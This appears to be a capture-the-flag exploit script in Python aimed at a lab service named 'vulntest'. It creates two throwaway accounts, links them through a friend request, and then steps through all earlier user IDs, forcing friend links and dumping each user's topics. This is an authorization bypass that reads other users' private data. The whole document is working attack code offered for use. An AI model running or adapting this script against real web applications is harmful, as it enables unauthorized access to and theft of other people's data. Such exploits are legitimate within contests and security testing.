#/usr/bin/env python3
import requests
import random
import string

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

host = 'vulntest'
port = 7000

url = f'http://{host}:{port}'

username1 = generator()
password1 = generator()

username2 = generator()
password2 = generator()

requests.post(url + '/register', json={
    'username': username1,
    'password': password1
})

requests.post(url + '/register', json={
    'username': username2,
    'password': password2
})

res = requests.post(url + '/login', json={
    'username': username1,
    'password': password1
})

user_id1 = res.json()['userId']
token1 = res.json()['token']

res = requests.post(url + '/login', json={
    'username': username2,
    'password': password2
})

user_id2 = res.json()['userId']
token2 = res.json()['token']

print(user_id1, user_id2)

requests.post(url + f'/friends?targetUserId={user_id2}', headers={
    'Authorization': 'Bearer ' + token1
})

for i in range(1, user_id1):
    requests.post(url + f'/friends/{i}', headers={
        'Authorization': 'Bearer ' + token2
    })
    res = requests.get(url + f'/topics/{i}?page=0', headers={
        'Authorization': 'Bearer ' + token2
    })
    print(res.text, flush=True)